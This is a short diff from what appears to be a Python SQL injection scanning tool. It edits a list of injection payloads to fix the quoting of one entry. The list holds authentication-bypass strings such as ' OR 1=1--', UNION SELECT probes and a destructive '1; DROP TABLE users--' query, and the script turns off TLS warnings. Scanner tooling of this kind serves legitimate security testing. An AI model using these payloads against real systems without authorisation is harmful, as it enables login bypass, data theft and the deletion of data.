@@ -32,7 +32,7 @@ requests.packages.urllib3.disable_warnings()
 SQLI_PAYLOADS = [
     # Classic error-based
     "'", "''", "';--", "' OR '1'='1", "' OR '1'='1'--",
-    "' OR 1=1--", "' OR 1=1#", "" OR "1"="1",
+    "' OR 1=1--", "' OR 1=1#", '\" OR \"1\"=\"1',
     "1; DROP TABLE users--", "1' AND 1=1--",
     # Union-based
     "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
